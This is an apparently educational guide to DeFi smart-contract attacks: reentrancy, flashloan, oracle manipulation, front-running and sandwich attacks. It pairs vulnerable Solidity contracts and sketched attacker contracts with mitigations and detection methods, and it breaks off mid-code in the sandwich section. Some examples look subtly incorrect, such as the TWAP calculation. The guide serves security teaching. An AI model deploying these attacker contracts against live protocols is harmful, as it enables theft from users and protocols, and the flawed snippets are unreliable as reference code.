# DeFi Reference Guide

> **Comprehensive guide to DeFi attacks, vulnerabilities, and ERC-4626 vault mathematics**

This guide consolidates DeFi attack vectors and ERC-4626 vault mathematics references.

## Table of Contents

### Part 1: DeFi Attacks and Vulnerabilities
1. [Reentrancy Attacks](#part-1-defi-attacks-and-vulnerabilities)
2. [Flashloan Attacks](#flashloan-attacks)
3. [Oracle Manipulation](#oracle-manipulation)
4. [Front-running and MEV](#front-running-and-mev)
5. [Sandwich Attacks](#sandwich-attacks)
6. [Price Manipulation](#price-manipulation)
7. [Governance Attacks](#governance-attacks)
8. [Signature Replay](#signature-replay)
9. [Integer Overflow/Underflow](#integer-overflowunderflow)
10. [Access Control Exploits](#access-control-exploits)
11. [Denial of Service (DoS)](#denial-of-service-dos)
12. [Vault Inflation Attacks](#vault-inflation-attacks)

### Part 2: ERC-4626 Vault Mathematics
1. [Fundamental Concepts](#fundamental-concepts)
2. [Core Share Calculation Formulas](#core-share-calculation-formulas)
3. [Rounding Modes](#rounding-modes)
4. [Function Specifications](#function-specifications)
5. [Inflation Attack Vectors](#inflation-attack-vectors)
6. [Edge Cases and Implementation](#edge-cases-and-singularities)

---

## 📊 Executive Summary

This guide covers **12 major DeFi attack vectors** and **ERC-4626 vault mathematics**.

**Attack Vectors Covered:**
1. **Reentrancy Attacks** - Most common vulnerability
2. **Flashloan Attacks** - Large-scale exploits
3. **Oracle Manipulation** - Price feed attacks
4. **Front-running and MEV** - Transaction ordering
5. **Sandwich Attacks** - DEX manipulation
6. **Price Manipulation** - AMM exploits
7. **Governance Attacks** - Voting manipulation
8. **Signature Replay** - Cross-chain attacks
9. **Integer Overflow/Underflow** - Math errors (low frequency after Solidity 0.8.0)
10. **Access Control Exploits** - Permission bugs
11. **Denial of Service (DoS)** - Gas griefing
12. **Vault Inflation Attacks** - ERC-4626 specific

**ERC-4626 Mathematics:**
- Share calculation formulas
- Rounding modes and precision
- Function specifications
- Edge cases and singularities

**Related Projects:**
- **Project 11**: [Reentrancy & Security](../07-reentrancy-and-security/) - Learn CEI pattern
- **Project 31**: [Reentrancy Lab](../31-reentrancy-lab/) - Hands-on attack simulation
- **Project 33**: [MEV & Front-Running](../33-mev-frontrunning/) - MEV exploitation
- **Project 34**: [Oracle Manipulation](../34-oracle-manipulation/) - Oracle attacks
- **Project 38**: [Signature Replay](../38-signature-replay/) - Signature attacks
- **Project 41**: [ERC-4626 Base Vault](../11-ERC4626-tokenized-vault/) - Vault implementation
- **Project 42**: [Vault Precision](../42-vault-precision/) - Rounding and precision
- **Project 44**: [Inflation Attack Demo](../44-inflation-attack/) - Inflation attack mitigation

**Related Documentation:**
- **[README.md](../README.md)** - Main entry point, project overview
- **[LEARNING_GUIDE.md](../LEARNING_GUIDE.md)** - Solidity syntax and Foundry guide
- **[PROJECT_MANAGEMENT.md](../PROJECT_MANAGEMENT.md)** - Learning paths and dependencies

---

# DeFi Attacks Reference Guide

A comprehensive guide to common DeFi attack vectors, vulnerabilities, and mitigation strategies for Solidity developers.

---

## Table of Contents

1. [Reentrancy Attacks](#reentrancy-attacks)
2. [Flashloan Attacks](#flashloan-attacks)
3. [Oracle Manipulation](#oracle-manipulation)
4. [Front-running and MEV](#front-running-and-mev)
5. [Sandwich Attacks](#sandwich-attacks)
6. [Price Manipulation](#price-manipulation)
7. [Governance Attacks](#governance-attacks)
8. [Signature Replay](#signature-replay)
9. [Integer Overflow/Underflow](#integer-overflowunderflow)
10. [Access Control Exploits](#access-control-exploits)
11. [Denial of Service (DoS)](#denial-of-service-dos)
12. [Vault Inflation Attacks](#vault-inflation-attacks)

---

## Reentrancy Attacks

### How It Works

Reentrancy occurs when a function makes an external call to another contract before updating its state. The called contract can then call back into the original function, potentially draining funds or manipulating state.

**Types of Reentrancy:**

1. **Single-Function Reentrancy**: The same function is called recursively
2. **Cross-Function Reentrancy**: Different functions in the same contract share state
3. **Cross-Contract Reentrancy**: Calls different contracts that interact back
4. **Read-Only Reentrancy**: Exploits view functions that read stale state

### Real-World Examples

- **The DAO Hack (2016)**: $50 million stolen through recursive calls to the withdraw function
- **Curve Finance (2020)**: $20 million vulnerability in lending protocol
- **Alchemix (2021)**: $15 million in single-function reentrancy
- **CREAM Finance (2021)**: Cross-contract reentrancy attack

### Code Examples

#### Vulnerable Contract

```solidity
// VULNERABLE: Single-function reentrancy
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    // VULNERABILITY: External call before state update
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // External call BEFORE updating state
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State update happens AFTER transfer
        balances[msg.sender] -= amount;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
}

// Attacker contract
contract Attacker {
    VulnerableBank public bank;

    constructor(address bankAddress) {
        bank = VulnerableBank(bankAddress);
    }

    function attack() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    // This fallback function is called when receiving ether
    receive() external payable {
        // Reenters the withdraw function
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }
}
```

#### Cross-Function Reentrancy Example

```solidity
// VULNERABLE: Cross-function reentrancy
pragma solidity ^0.8.0;

contract VulnerableSwap {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    function deposit(uint256 amount) external {
        balances[msg.sender] += amount;
        totalSupply += amount;
        // Transfer tokens from user
        IERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    // VULNERABILITY: This function reads totalSupply which can be outdated
    function withdraw(uint256 shares) external {
        uint256 amount = (shares * address(this).balance) / totalSupply;

        // External call before updating state
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State update after external call
        balances[msg.sender] -= shares;
        totalSupply -= shares;
    }

    function redeem(uint256 shares) external {
        // This can be exploited in combination with withdraw
        uint256 amount = (shares * address(this).balance) / totalSupply;
        IERC20(token).transfer(msg.sender, amount);
        balances[msg.sender] -= shares;
        totalSupply -= shares;
    }
}
```

#### Read-Only Reentrancy

```solidity
// VULNERABLE: Read-only reentrancy
pragma solidity ^0.8.0;

interface IFlashLoanReceiver {
    function executeOperation(
        address token,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bytes32);
}

contract VulnerablePriceOracle {
    ILendingPool public lendingPool;
    IERC20 public token;

    // VULNERABILITY: Returns stale state during reentrancy
    function getPrice() external view returns (uint256) {
        uint256 balance = token.balanceOf(address(this));
        uint256 totalSupply = token.totalSupply();
        return balance * 1e18 / totalSupply;
    }

    function flashLoan(uint256 amount) external {
        // During this call, getPrice() can be called with outdated state
        lendingPool.flashLoan(address(this), address(token), amount, "");
    }

    function executeOperation(
        address,
        uint256 amount,
        uint256 premium,
        address,
        bytes calldata
    ) external override returns (bytes32) {
        // Attacker can call getPrice() here and get stale data

        // Return loan with interest
        token.approve(address(lendingPool), amount + premium);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

### Mitigation Strategies

1. **Checks-Effects-Interactions (CEI) Pattern**
   ```solidity
   function withdraw(uint256 amount) external {
       // Checks
       require(balances[msg.sender] >= amount, "Insufficient balance");

       // Effects (state changes first)
       balances[msg.sender] -= amount;

       // Interactions (external calls last)
       (bool success, ) = msg.sender.call{value: amount}("");
       require(success, "Transfer failed");
   }
   ```

2. **Reentrancy Guard (Mutex Pattern)**
   ```solidity
   pragma solidity ^0.8.0;

   contract ReentrancyGuard {
       uint256 private locked = 1;

       modifier nonReentrant() {
           require(locked == 1, "No reentrancy");
           locked = 2;
           _;
           locked = 1;
       }

       function withdraw(uint256 amount) external nonReentrant {
           require(balances[msg.sender] >= amount);
           balances[msg.sender] -= amount;
           (bool success, ) = msg.sender.call{value: amount}("");
           require(success);
       }
   }
   ```

3. **Pull over Push Pattern**
   ```solidity
   // Instead of pushing funds to users
   function withdrawPull() external {
       uint256 amount = balances[msg.sender];
       balances[msg.sender] = 0;
       (bool success, ) = msg.sender.call{value: amount}("");
       require(success);
   }
   ```

4. **Snapshot State**
   ```solidity
   function withdraw(uint256 amount) external {
       uint256 userBalance = balances[msg.sender];
       require(userBalance >= amount);
       balances[msg.sender] = userBalance - amount;
       // Safe to use userBalance as it won't change during call
       _sendFunds(msg.sender, amount);
   }
   ```

5. **Use OpenZeppelin's ReentrancyGuard**
   ```solidity
   import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

   contract SafeBank is ReentrancyGuard {
       function withdraw(uint256 amount) external nonReentrant {
           // Protected against reentrancy
           _executeWithdraw(amount);
       }
   }
   ```

### Detection Methods

- Static analysis tools: Slither, Mythril, Certora
- Dynamic testing: Fuzz testing with Echidna
- Manual code review: Look for external calls before state updates
- Test for reentrancy: Try calling back into functions during external calls
- Monitor state snapshots: Track state changes during execution

---

## Flashloan Attacks

### How It Works

Flashloans allow users to borrow large amounts of crypto without collateral, provided they repay within the same transaction. Attackers use flashloans to:
- Manipulate prices temporarily
- Drain liquidity pools
- Exploit price oracles
- Perform large trades with borrowed capital

### Real-World Examples

- **bZx Attack (2020)**: $350,000 profit using flashloans to manipulate price oracles
- **Harvest Finance (2020)**: $34 million through stablecoin oracle manipulation
- **Pancake Bunny (2021)**: $45 million using bunny price manipulation
- **dYdX and Fulcrum (2020)**: Multiple flashloan attacks

### Code Examples

#### Vulnerable Flashloan Usage

```solidity
// VULNERABLE: Doesn't validate borrowed amount
pragma solidity ^0.8.0;

interface IFlashLoanReceiver {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bytes32);
}

interface IFlashLoanProvider {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata params
    ) external;
}

contract VulnerableFlashloanBorrower is IFlashLoanReceiver {
    IFlashLoanProvider public lender;
    IPriceOracle public oracle;
    IERC20 public usdc;

    constructor(address _lender, address _oracle) {
        lender = IFlashLoanProvider(_lender);
        oracle = IPriceOracle(_oracle);
    }

    function attackFlashloan() external {
        // Borrow huge amount at no cost
        lender.flashLoan(address(this), address(usdc), 1000000e6, "");
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bytes32) {
        // VULNERABILITY: Price oracle is now outdated
        uint256 tokenPrice = oracle.getPrice(); // Can be manipulated

        // Attacker can exploit the outdated price
        // Example: Dump large amount and collect collateral at inflated price

        // Repay loan (usually done with profit)
        uint256 amountOwed = amount + premium;
        IERC20(asset).approve(address(lender), amountOwed);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

// Attack scenario: Pump and dump the token
contract FlashloanAttacker {
    IFlashLoanProvider public lender;
    IUniswapV2Router public router;
    IERC20 public usdc;
    IERC20 public token;

    function execute() external {
        // Step 1: Borrow massive amount of USDC
        lender.flashLoan(address(this), address(usdc), 10000000e6, "");
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bytes32) {
        // Step 2: Use borrowed USDC to pump token price
        address[] memory path = new address[](2);
        path[0] = address(usdc);
        path[1] = address(token);

        usdc.approve(address(router), amount);
        router.swapExactTokensForTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp + 1
        );

        // Step 3: Price is now inflated, exploit contracts that read old price
        // ...do more stuff...

        // Step 4: Dump tokens back for profit
        path[0] = address(token);
        path[1] = address(usdc);

        // Step 5: Repay flashloan and keep profit
        uint256 amountOwed = amount + premium;
        IERC20(asset).approve(address(lender), amountOwed);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}
```

#### Oracle Manipulation via Flashloan

```solidity
// VULNERABLE: Price oracle manipulated by flashloan
pragma solidity ^0.8.0;

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract VulnerablePriceOracle {
    IUniswapV2Pair public pair;
    uint256 public price;

    // VULNERABILITY: Uses spot price from Uniswap
    function updatePrice() external {
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        price = (reserve0 * 1e18) / reserve1; // Easily manipulated
    }

    function getPrice() external view returns (uint256) {
        return price;
    }
}

contract FlashloanOracleAttack {
    IFlashLoanProvider public lender;
    IUniswapV2Router public router;
    IERC20 public tokenA;
    IERC20 public tokenB;
    VulnerablePriceOracle public oracle;

    function attack() external {
        // Borrow tokens to manipulate reserves
        lender.flashLoan(address(this), address(tokenA), 100000e18, "");
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bytes32) {
        // Swap to manipulate reserves (pump tokenA price)
        tokenA.approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(tokenA);
        path[1] = address(tokenB);

        router.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);

        // Now tokenA is expensive in the pair, call oracle update
        oracle.updatePrice(); // Price is now inflated

        // Exploit contracts that use oracle.getPrice()
        // ...do attack...

        // Repay flashloan
        uint256 amountOwed = amount + premium;
        IERC20(asset).approve(address(lender), amountOwed);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}
```

### Mitigation Strategies

1. **Use Multiple Price Sources (TWAP)**
   ```solidity
   pragma solidity ^0.8.0;

   contract SafePriceOracle {
       IUniswapV2Pair public pair;
       uint256 public price0CumulativeLast;
       uint256 public price1CumulativeLast;
       uint32 public blockTimestampLast;

       // Time-Weighted Average Price (TWAP) - resistant to flashloan attacks
       function updateTWAP() external {
           (uint112 reserve0, uint112 reserve1, uint32 blockTimestamp) = pair.getReserves();

           uint32 timeElapsed = blockTimestamp - blockTimestampLast;
           require(timeElapsed >= 1 hours, "TWAP: Window not passed");

           uint256 price0Cumulative = (uint256(reserve1) << 112) / reserve0;
           uint256 price1Cumulative = (uint256(reserve0) << 112) / reserve1;

           price0CumulativeLast = price0Cumulative;
           price1CumulativeLast = price1Cumulative;
           blockTimestampLast = blockTimestamp;
       }

       function getTWAPPrice() external view returns (uint256) {
           return price0CumulativeLast; // Returns TWAP, not spot price
       }
   }
   ```

2. **Use Chainlink or Band Protocol**
   ```solidity
   pragma solidity ^0.8.0;

   import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

   contract SafeChainlinkOracle {
       AggregatorV3Interface public priceFeed;

       constructor(address feedAddress) {
           priceFeed = AggregatorV3Interface(feedAddress);
       }

       // Decentralized, tamper-resistant price feed
       function getLatestPrice() external view returns (uint256) {
           (, int256 price, , uint256 updatedAt, ) = priceFeed.latestRoundData();
           require(updatedAt >= block.timestamp - 1 hours, "Stale price");
           return uint256(price);
       }
   }
   ```

3. **Batch/Time Delays**
   ```solidity
   pragma solidity ^0.8.0;

   contract DelayedExecution {
       mapping(address => uint256) public pendingWithdrawals;
       mapping(address => uint256) public withdrawalTime;
       uint256 constant DELAY = 1 days;

       function requestWithdrawal(uint256 amount) external {
           require(userBalance[msg.sender] >= amount);
           pendingWithdrawals[msg.sender] = amount;
           withdrawalTime[msg.sender] = block.timestamp + DELAY;
       }

       function executeWithdrawal() external {
           require(block.timestamp >= withdrawalTime[msg.sender], "Withdrawal not ready");
           uint256 amount = pendingWithdrawals[msg.sender];
           pendingWithdrawals[msg.sender] = 0;

           (bool success, ) = msg.sender.call{value: amount}("");
           require(success);
       }
   }
   ```

4. **Validate Flashloan Amounts**
   ```solidity
   pragma solidity ^0.8.0;

   contract SafeFlashloanBorrower {
       uint256 public maxFlashloan = 1000000e18; // Set reasonable limits

       function executeOperation(
           address asset,
           uint256 amount,
           uint256 premium,
           address initiator,
           bytes calldata params
       ) external override returns (bytes32) {
           require(amount <= maxFlashloan, "Flashloan too large");
           // Rest of implementation
           return keccak256("ERC3156FlashBorrower.onFlashLoan");
       }
   }
   ```

### Detection Methods

- Monitor unusual borrowing patterns
- Check for price deviation from external sources (Chainlink)
- Analyze transaction sequencing for manipulation
- Use price change alerts
- Monitor reserve ratio changes in AMMs
- Implement maximum price change checks

---

## Oracle Manipulation

### How It Works

Smart contracts rely on price oracles to determine asset values. Attackers manipulate these oracles by:
- Trading on-chain to move prices
- Exploiting single-source oracles
- Manipulating TWAP calculations
- Providing false data from centralized oracles

### Real-World Examples

- **bZx Attacks (2020)**: $350,000 from oracle manipulation
- **Harvest Finance (2020)**: $34 million from stablecoin oracle issues
- **Pancake Bunny (2021)**: $45 million from price feed manipulation
- **USDC Depegging (2023)**: Oracle failures during USDC depegging event

### Code Examples

#### Vulnerable Single-Source Oracle

```solidity
// VULNERABLE: Single source oracle
pragma solidity ^0.8.0;

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract VulnerableOracle {
    IUniswapV2Pair public pair;

    // VULNERABILITY: Uses only Uniswap spot price
    function getPrice() external view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        return (reserve0 * 1e18) / reserve1;
    }
}

contract OracleAttacker {
    IUniswapV2Router public router;
    VulnerableOracle public oracle;
    IERC20 public tokenA;
    IERC20 public tokenB;

    function manipulatePrice() external {
        // Buy huge amount of tokenA to increase price
        address[] memory path = new address[](2);
        path[0] = address(tokenB);
        path[1] = address(tokenA);

        router.swapExactTokensForTokens(
            10000e18, // Spend 10k tokenB
            0,
            path,
            address(this),
            block.timestamp
        );

        // Now price is manipulated
        uint256 manipulatedPrice = oracle.getPrice(); // Much higher

        // Exploit contracts using this price
        // ...do attack...
    }
}
```

#### Stale Price Vulnerability

```solidity
// VULNERABLE: No freshness check
pragma solidity ^0.8.0;

interface AggregatorV3Interface {
    function latestRoundData() external view returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    );
}

contract VulnerableStaleOracle {
    AggregatorV3Interface public priceFeed;

    // VULNERABILITY: No check if price is stale
    function getPrice() external view returns (uint256) {
        (, int256 price, , , ) = priceFeed.latestRoundData();
        return uint256(price);
    }

    // Attacker exploits stale price during network congestion
}
```

#### Composable Oracle Attack

```solidity
// VULNERABLE: Derivable price from on-chain data
pragma solidity ^0.8.0;

contract VulnerableComposableOracle {
    IUniswapV2Pair public pair;

    // VULNERABILITY: Price calculated from manipulable reserves
    function getDerivedPrice() external view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();

        // Any reserve imbalance = price manipulation opportunity
        uint256 price = (reserve0 * 1e18) / reserve1;
        return price;
    }
}
```

### Mitigation Strategies

1. **Multiple Oracle Sources**
   ```solidity
   pragma solidity ^0.8.0;

   contract MultiSourceOracle {
       AggregatorV3Interface public chainlinkFeed;
       IUniswapV2Pair public uniswapPair;
       IBandOracle public bandOracle;

       function getPriceConsensus() external view returns (uint256) {
           uint256 chainlinkPrice = getChainlinkPrice();
           uint256 uniswapPrice = getUniswapTWAP();
           uint256 bandPrice = getBandPrice();

           // Check prices are within acceptable range of each other
           uint256 maxPrice = max(chainlinkPrice, max(uniswapPrice, bandPrice));
           uint256 minPrice = min(chainlinkPrice, min(uniswapPrice, bandPrice));

           require(maxPrice <= minPrice * 110 / 100, "Prices diverged");

           return (chainlinkPrice + uniswapPrice + bandPrice) / 3;
       }

       function getChainlinkPrice() internal view returns (uint256) {
           (, int256 price, , uint256 updatedAt, ) = chainlinkFeed.latestRoundData();
           require(updatedAt >= block.timestamp - 1 hours, "Stale Chainlink price");
           return uint256(price);
       }

       function getUniswapTWAP() internal view returns (uint256) {
           // Returns TWAP price from Uniswap (resistant to manipulation)
           return calculateTWAP();
       }

       function getBandPrice() internal view returns (uint256) {
           // Get price from Band Protocol
           return bandOracle.getReferenceData(symbol, "USD").rate;
       }

       function max(uint256 a, uint256 b) internal pure returns (uint256) {
           return a > b ? a : b;
       }

       function min(uint256 a, uint256 b) internal pure returns (uint256) {
           return a < b ? a : b;
       }
   }
   ```

2. **TWAP (Time-Weighted Average Price)**
   ```solidity
   pragma solidity ^0.8.0;

   contract TWAPOracle {
       IUniswapV2Pair public pair;
       uint256 public price0CumulativeLast;
       uint256 public price1CumulativeLast;
       uint32 public blockTimestampLast;
       uint256 public twapInterval = 1 hours;

       constructor(address _pair) {
           pair = IUniswapV2Pair(_pair);
           (uint112 reserve0, uint112 reserve1, uint32 blockTimestamp) = pair.getReserves();
           price0CumulativeLast = IUniswapV2Pair(_pair).price0CumulativeLast();
           price1CumulativeLast = IUniswapV2Pair(_pair).price1CumulativeLast();
           blockTimestampLast = blockTimestamp;
       }

       function update() external {
           (uint112 reserve0, uint112 reserve1, uint32 blockTimestamp) = pair.getReserves();
           uint32 timeElapsed = blockTimestamp - blockTimestampLast;

           require(timeElapsed >= twapInterval, "TWAP: Too soon");

           price0CumulativeLast = pair.price0CumulativeLast();
           price1CumulativeLast = pair.price1CumulativeLast();
           blockTimestampLast = blockTimestamp;
       }

       // TWAP resistant to single block price movements
       function getTWAPPrice() external view returns (uint256) {
           return price0CumulativeLast / blockTimestampLast;
       }
   }
   ```

3. **Freshness Validation**
   ```solidity
   pragma solidity ^0.8.0;

   contract FreshnessManagedOracle {
       AggregatorV3Interface public feed;
       uint256 public maxStaleness = 1 hours;

       function getLatestPrice() external view returns (uint256) {
           (
               uint80 roundId,
               int256 price,
               uint256 startedAt,
               uint256 updatedAt,
               uint80 answeredInRound
           ) = feed.latestRoundData();

           require(answeredInRound >= roundId, "Stale price");
           require(updatedAt > 0, "Round not complete");
           require(block.timestamp - updatedAt <= maxStaleness, "Price too old");

           return uint256(price);
       }
   }
   ```

### Detection Methods

- Monitor price deviations across exchanges
- Set price change thresholds and alerts
- Use multiple independent oracles
- Implement circuit breakers
- Watch for unusual trading volume
- Monitor time gaps in price updates

---

## Front-running and MEV

### How It Works

Front-running occurs when attackers observe pending transactions and place their own transactions ahead to profit from price movements. MEV (Miner Extractable Value) is the profit from reordering, censoring, or inserting transactions.

**Types:**
- Simple front-running: Place order before victim's transaction
- Sandwich attack: Place orders before and after victim
- MEV extraction: Reorder transactions for profit
- Liquidation sniping: Prioritize liquidations

### Real-World Examples

- **Uniswap Sandwich Attacks**: Billions in MEV extracted
- **Liquidation Competition**: Miners/validators reorder to capture liquidations
- **DEX Arbitrage**: Bots extract MEV from price disparities
- **Token Launch Front-running**: Thousands of ETH taken from early buyers

### Code Examples

#### Vulnerable Smart Contract

```solidity
// VULNERABLE: Susceptible to front-running
pragma solidity ^0.8.0;

contract VulnerableSwap {
    IERC20 public tokenA;
    IERC20 public tokenB;
    uint256 public price;

    // VULNERABILITY: No slippage protection
    function swap(uint256 amountIn) external returns (uint256 amountOut) {
        require(amountIn > 0);

        // Calculate output based on current price
        amountOut = (amountIn * price) / 1e18;

        // Transfer tokens
        tokenA.transferFrom(msg.sender, address(this), amountIn);
        tokenB.transfer(msg.sender, amountOut);

        return amountOut;
    }
}

// Front-runner bot
contract FrontRunner {
    IUniswapV2Router public router;
    IERC20 public tokenA;
    IERC20 public tokenB;

    function frontRun(uint256 victimAmount) external {
        // 1. See victim's pending swap in mempool
        // 2. Front-run with larger order
        address[] memory path = new address[](2);
        path[0] = address(tokenA);
        path[1] = address(tokenB);

        router.swapExactTokensForTokens(
            victimAmount * 2, // Larger order
            0,
            path,
            address(this),
            block.timestamp
        );

        // 3. Victim's transaction executes at worse price
        // 4. Back-run to reverse position

        path[0] = address(tokenB);
        path[1] = address(tokenA);

        uint256 tokenBBalance = tokenB.balanceOf(address(this));
        router.swapExactTokensForTokens(
            tokenBBalance,
            0,
            path,
            address(this),
            block.timestamp
        );

        // Profit = difference in execution prices
    }
}
```

#### Private Mempool Exploitation

```solidity
// VULNERABLE: Price determined in same transaction
pragma solidity ^0.8.0;

contract VulnerableAMM {
    uint256 public reserve0;
    uint256 public reserve1;

    // VULNERABILITY: Price calculation happens in same transaction
    function getAmountOut(uint256 amountIn) public view returns (uint256) {
        return (amountIn * reserve1) / (reserve0 + amountIn);
    }

    function swap(uint256 amountIn, uint256 minAmountOut) external {
        uint256 amountOut = getAmountOut(amountIn);

        require(amountOut >= minAmountOut, "Slippage exceeded");

        reserve0 += amountIn;
        reserve1 -= amountOut;

        IERC20(token0).transferFrom(msg.sender, address(this), amountIn);
        IERC20(token1).transfer(msg.sender, amountOut);
    }
}

contract MEVBot {
    IFlashBots public flashbots;

    function bundleSwap() external {
        // Use Flashbots to hide transaction from mempool
        // Execute without front-running risk
        flashbots.sendBundle(/* bundle data */);
    }
}
```

### Mitigation Strategies

1. **Slippage Protection**
   ```solidity
   pragma solidity ^0.8.0;

   contract SafeSwap {
       IUniswapV2Router public router;

       function swapWithSlippage(
           uint256 amountIn,
           uint256 minAmountOut,
           address[] calldata path
       ) external returns (uint256[] memory amounts) {
           IERC20(path[0]).transferFrom(msg.sender, address(this), amountIn);
           IERC20(path[0]).approve(address(router), amountIn);

           amounts = router.swapExactTokensForTokens(
               amountIn,
               minAmountOut, // PROTECTION: Revert if output too low
               path,
               msg.sender,
               block.timestamp
           );
       }
   }
   ```

2. **Price Oracle Validation**
   ```solidity
   pragma solidity ^0.8.0;

   contract PriceValidatedSwap {
       IPriceOracle public oracle;
       uint256 public maxSlippage = 50; // 0.5%

       function swapWithPriceCheck(
           uint256 amountIn,
           uint256 minAmountOut,
           address tokenIn,
           address tokenOut
       ) external {
           // Get fair price from oracle
           uint256 oraclePrice = oracle.getPrice(tokenIn, tokenOut);

           // Calculate expected output
           uint256 expectedOut = (amountIn * oraclePrice) / 1e18;

           // Allow only small slippage
           uint256 minOut = (expectedOut * (10000 - maxSlippage)) / 10000;
           require(minAmountOut >= minOut, "Slippage too high");

           // Execute swap
           _executeSwap(amountIn, minAmountOut, tokenIn, tokenOut);
       }
   }
   ```

3. **Batch Auctions (MEV-Resistant)**
   ```solidity
   pragma solidity ^0.8.0;

   contract BatchAuction {
       struct Order {
           address user;
           uint256 amountIn;
           uint256 minAmountOut;
       }

       Order[] public pendingOrders;
       uint256 public batchNumber;
       uint256 public batchSize = 100;

       function submitOrder(
           uint256 amountIn,
           uint256 minAmountOut
       ) external {
           pendingOrders.push(Order(msg.sender, amountIn, minAmountOut));

           if (pendingOrders.length >= batchSize) {
               executeBatch();
           }
       }

       function executeBatch() internal {
           // All orders execute at same price
           // Eliminates front-running within batch

           uint256 totalIn = 0;
           for (uint256 i = 0; i < pendingOrders.length; i++) {
               totalIn += pendingOrders[i].amountIn;
           }

           uint256 totalOut = calculateOutput(totalIn);
           uint256 pricePerUnit = totalOut / totalIn;

           // Execute all orders at batch price
           for (uint256 i = 0; i < pendingOrders.length; i++) {
               Order memory order = pendingOrders[i];
               uint256 out = (order.amountIn * pricePerUnit) / 1e18;
               require(out >= order.minAmountOut, "Slippage");
               transfer(order.user, out);
           }

           delete pendingOrders;
           batchNumber++;
       }
   }
   ```

4. **Encrypted Mempools**
   ```solidity
   pragma solidity ^0.8.0;

   // Use Flashbots Protect (MEV-resistant)
   contract FlashbotsProtected {
       // Submit transactions through Flashbots Protect
       // Transactions are encrypted and protected from MEV

       function protectedSwap(
           uint256 amountIn,
           uint256 minAmountOut,
           address[] calldata path
       ) external {
           // Send to: https://relay.flashbots.net/
           // Transaction is private until included

           // Standard swap execution
           _swap(amountIn, minAmountOut, path);
       }
   }
   ```

### Detection Methods

- Monitor mempool for similar transactions
- Track execution prices vs. expected prices
- Analyze transaction ordering patterns
- Use MEV dashboards (MEV-Inspect, Flashbots)
- Monitor for sandwich attacks in logs
- Track profit/loss patterns

---

## Sandwich Attacks

### How It Works

A sandwich attack places a transaction before (front-run) and after (back-run) a victim's transaction to profit from price impact:

1. Attacker sees victim's large transaction in mempool
2. Places order BEFORE victim's transaction
3. Victim's transaction causes price movement
4. Attacker's position is now profitable
5. Places order AFTER victim to reverse or profit

### Real-World Examples

- **Uniswap Sandwich Attacks**: Daily extraction of millions in MEV
- **Arbitrage Sandwich**: Bot front-runs trade, back-runs to reverse
- **Liquidation Sandwich**: Liquidators sandwich borrower transactions
- **Token Transfer Sandwich**: Atomic sandwich on transfers

### Code Examples

#### Sandwich Attack Execution

```solidity
// VULNERABLE: Standard AMM swap
pragma solidity ^0.8.0;

contract VulnerableAMM {
    uint256 public reserve0;
    uint256 public reserve1;

    function swap(uint256 amountIn, uint256 minAmountOut) external {
        uint256 amountOut = (amountIn * reserve1) / (reserve0 + amountIn);
        require(amountOut >= minAmountOut);

        reserve0 += amountIn;
        reserve1 -= amountOut;

        transfer(msg.sender, amountOut);
    }
}

// Sandwich attacker
contract SandwichAttacker {
    IUniswapV2Router public router;
    IERC20 public tokenA;
    IERC20 public tokenB;

    function executeSandwich(
        uint256 victimAmount,
        address victim
    ) external {
        // Step 1: Front-run - buy token B (pump price)
        address[] memory path = new address[](2);
        path[0] = address(tokenA);
        path[1] = address(tokenB);

        uint256 frontRunAmount = victimAmount / 2;

        router.swapExactTokensForTokens(
            frontRunAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        // Step 2: Victim's transaction executes
        // Victim gets worse price because we pumped tokenB

        // Step 3: Back-run - sell token B
        path[0] = address(tokenB);
        path[1] = address(tokenA);

        uint256 tokenBBalance = tokenB.balanceOf(address(this));

        router.swapExactTokensForTokens(
            tokenBBalance,
            0,
            path,
            address(this),
            block.timestamp
        );

        // Profit = price difference from front-run and back-run
    }
}
```

#### Atomic Sandwich Attack

```solidity
// Sandwich attack in single transaction
pragma solidity ^0.8.0;

contract AtomicSandwich {
    IUniswapV2Router public router;
    IERC20 public tokenA;
    IERC20 public tokenB;

    function sandwichExecution(
        address victim,
        uint256 victimAmount
    ) external {
        // Using EIP-712 signature to execute victim's transaction in same block

        // 1. Front-run swap
        _frontRunSwap(victimAmount);

